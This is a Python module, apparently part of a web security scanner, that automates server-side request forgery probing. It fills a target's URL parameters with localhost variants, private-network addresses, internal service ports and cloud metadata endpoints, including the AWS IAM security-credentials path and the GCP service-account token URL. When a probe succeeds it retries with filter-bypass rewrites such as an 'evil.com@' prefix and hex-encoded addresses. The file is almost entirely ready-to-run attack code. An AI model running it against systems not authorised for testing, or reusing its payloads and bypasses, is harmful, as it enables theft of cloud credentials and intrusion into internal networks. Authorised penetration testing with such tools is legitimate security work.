"""SSRF Chain Builder — auto-chain SSRF to internal endpoints and cloud metadata."""

import aiohttp
import asyncio
from urllib.parse import urljoin, quote
from modules.core import console

SSRF_PARAMS = [
    'url', 'uri', 'path', 'redirect', 'next', 'page', 'link',
    'src', 'source', 'dest', 'destination', 'target', 'file',
    'load', 'fetch', 'callback', 'proxy', 'request', 'forward',
    'domain', 'host', 'site', 'img', 'image', 'ref',
]

INTERNAL_TARGETS = [
    ('Localhost', 'http://127.0.0.1'),
    ('Localhost Alt', 'http://0.0.0.0'),
    ('Localhost IPv6', 'http://[::1]'),
    ('Localhost Decimal', 'http://2130706433'),
    ('Localhost Hex', 'http://0x7f000001'),
    ('Localhost Octal', 'http://0177.0.0.1'),
    ('Internal 10.x', 'http://10.0.0.1'),
    ('Internal 172.x', 'http://172.16.0.1'),
    ('Internal 192.x', 'http://192.168.1.1'),
]

CLOUD_METADATA = [
    ('AWS IMDSv1', 'http://169.254.169.254/latest/meta-data/'),
    ('AWS IAM', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
    ('AWS Token', 'http://169.254.169.254/latest/api/token'),
    ('GCP Metadata', 'http://metadata.google.internal/computeMetadata/v1/'),
    ('GCP Token', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'),
    ('Azure Metadata', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'),
    ('DigitalOcean', 'http://169.254.169.254/metadata/v1/'),
    ('Kubernetes', 'https://kubernetes.default.svc/'),
]

INTERNAL_SERVICES = [
    ('Redis', 'http://127.0.0.1:6379/'),
    ('Elasticsearch', 'http://127.0.0.1:9200/'),
    ('MongoDB', 'http://127.0.0.1:27017/'),
    ('MySQL', 'http://127.0.0.1:3306/'),
    ('PostgreSQL', 'http://127.0.0.1:5432/'),
    ('Docker API', 'http://127.0.0.1:2375/version'),
    ('Consul', 'http://127.0.0.1:8500/v1/agent/self'),
    ('Jenkins', 'http://127.0.0.1:8080/'),
    ('Prometheus', 'http://127.0.0.1:9090/'),
    ('Grafana', 'http://127.0.0.1:3000/'),
]

BYPASS_TECHNIQUES = [
    lambda u: u,
    lambda u: u.replace('127.0.0.1', '127.0.0.1.nip.io'),
    lambda u: u.replace('http://', 'http://evil.com@'),
    lambda u: u + '#',
    lambda u: u.replace('http://', 'http://0x7f.0x0.0x0.0x1/') if '127.0.0.1' in u else u,
    lambda u: quote(u, safe=''),
]


async def _test_ssrf(session, url, param, target_url, target_name):
    """Test a single SSRF vector."""
    try:
        params = {param: target_url}
        async with session.get(url, params=params,
                               timeout=aiohttp.ClientTimeout(total=10),
                               ssl=False) as resp:
            body = await resp.text()

            indicators = ['ami-', 'instance-id', 'local-ipv4', 'security-credentials',
                          'computeMetadata', 'access_token', 'redis_version',
                          'elasticsearch', 'mongodb', 'docker', 'jenkins',
                          'consul', 'kubernetes', '127.0.0.1', 'localhost']

            for indicator in indicators:
                if indicator.lower() in body.lower() and len(body) > 20:
                    return {
                        'type': f'SSRF → {target_name}',
                        'param': param,
                        'target': target_url[:60],
                        'severity': 'Critical' if 'metadata' in target_name.lower() or 'credential' in target_name.lower() else 'High',
                        'indicator': indicator,
                        'response_size': len(body),
                    }
    except Exception:
        pass
    return None


async def scan_ssrf_chain(session, url):
    """SSRF chain builder — test internal access and cloud metadata."""
    console.print(f"\n[bold cyan]--- SSRF Chain Builder ---[/bold cyan]")

    all_targets = INTERNAL_TARGETS + CLOUD_METADATA + INTERNAL_SERVICES
    total_tests = len(SSRF_PARAMS) * len(all_targets)
    console.print(f"  [cyan]Testing {total_tests} SSRF vectors ({len(SSRF_PARAMS)} params x {len(all_targets)} targets)...[/cyan]")

    all_findings = []

    for param in SSRF_PARAMS[:10]:
        for target_name, target_url in all_targets:
            result = await _test_ssrf(session, url, param, target_url, target_name)
            if result:
                all_findings.append(result)
                console.print(f"  [bold red]⚠ {result['type']}: ?{param}={target_url[:40]}[/bold red]")

                for bypass_fn in BYPASS_TECHNIQUES[1:]:
                    bypassed = bypass_fn(target_url)
                    bypass_result = await _test_ssrf(session, url, param, bypassed, f"{target_name} (bypass)")
                    if bypass_result:
                        all_findings.append(bypass_result)
                        console.print(f"  [red]Bypass: {bypassed[:50]}[/red]")

        await asyncio.sleep(0.05)

    if all_findings:
        console.print(f"\n  [bold red]{len(all_findings)} SSRF chains found![/bold red]")
        cloud = [f for f in all_findings if 'metadata' in f['type'].lower() or 'aws' in f['type'].lower()]
        if cloud:
            console.print(f"  [bold red]⚠ {len(cloud)} CLOUD METADATA ACCESSIBLE![/bold red]")
    else:
        console.print(f"\n  [green]✓ No SSRF vectors detected[/green]")

    return {'findings': all_findings}
